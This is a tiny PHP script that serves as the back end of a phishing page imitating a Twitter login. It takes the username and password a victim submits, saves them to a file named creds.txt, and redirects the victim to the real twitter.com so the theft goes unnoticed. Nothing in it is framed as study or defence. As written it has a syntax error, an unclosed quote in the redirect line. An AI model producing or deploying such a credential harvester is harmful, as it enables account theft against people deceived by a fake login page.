<?php
file_put_contents("creds.txt", "[**] Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass']);
header('Location: https://twitter.com/);
exit();
?>
